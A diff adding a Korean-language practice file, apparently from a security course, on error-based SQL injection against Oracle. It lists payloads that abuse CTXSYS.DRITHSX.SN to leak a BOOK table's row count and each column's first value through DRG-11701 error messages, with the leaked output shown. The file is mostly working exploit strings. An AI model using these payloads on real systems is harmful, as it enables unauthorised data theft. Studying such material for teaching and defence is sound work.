@@ -1,0 +1,36 @@
+-- 0903 Error-Based SQL Injection 공격 연습문제
+
+-- BOOK 테이블의 각 컬럼명은 모두 획득했다는 가정.
+
+1. BOOK 테이블의 레코드 수 획득
+BOOK 테이블의 전체 레코드(행) 수를 확인하는 공격 문구.
+
+공격 문구:
+' OR CTXSYS.DRITHSX.SN(user, (SELECT COUNT(*) FROM BOOK))=1 --
+
+에러메세지 :
+DRG-11701: 4 키워드 사전이 존재하지 않습니다
+
+2. BOOK 테이블의 컬럼별 데이터 획득
+ROWNUM을 사용하여 BOOK 테이블의 각 행에 순차적으로 접근하며, 컬럼별 데이터를 획득하는 공격 문구.
+RNUM 값을 1부터 하나씩 증가시키며 모든 데이터를 탈취 가능.
+
+● BOOKNO 컬럼의 첫 번째 데이터 획득
+	▶ 공격 문구 : ' OR CTXSYS.DRITHSX.SN(user, (SELECT BOOKNO FROM (SELECT BOOKNO, ROWNUM AS RNUM FROM BOOK) WHERE RNUM=1))=1 --
+	▷ 에러 메시지 : DRG-11701: 1 키워드 사전이 존재하지 않습니다
+
+● BOOKNAME 컬럼의 첫 번째 데이터 획득
+	▶ 공격 문구 : ' OR CTXSYS.DRITHSX.SN(user, (SELECT BOOKNAME FROM (SELECT BOOKNAME, ROWNUM AS RNUM FROM BOOK) WHERE RNUM=1))=1 --
+	▷ 에러 메시지 : DRG-11701: 자바 키워드 사전이 존재하지 않습니다
+
+● BOOKPRICE 컬럼의 첫 번째 데이터 획득
+	▶ 공격 문구 : ' OR CTXSYS.DRITHSX.SN(user, (SELECT BOOKPRICE FROM (SELECT BOOKPRICE, ROWNUM AS RNUM FROM BOOK) WHERE RNUM=1))=1 --
+	▷ 에러 메시지 : DRG-11701: 20000 키워드 사전이 존재하지 않습니다
+
+● BOOKDATE 컬럼의 첫 번째 데이터 획득
+	▶ 공격 문구 : ' OR CTXSYS.DRITHSX.SN(user, (SELECT BOOKDATE FROM (SELECT BOOKDATE, ROWNUM AS RNUM FROM BOOK) WHERE RNUM=1))=1 --
+	▷ 에러 메시지 : DRG-11701: 19/01/01 키워드 사전이 존재하지 않습니다
+
+● PUBNO 컬럼의 첫 번째 데이터 획득
+	▶ 공격 문구 : ' OR CTXSYS.DRITHSX.SN(user, (SELECT PUBNO FROM (SELECT PUBNO, ROWNUM AS RNUM FROM BOOK) WHERE RNUM=1))=1 --
+	▷ 에러 메시지 : DRG-11701: 2 키워드 사전이 존재하지 않습니다
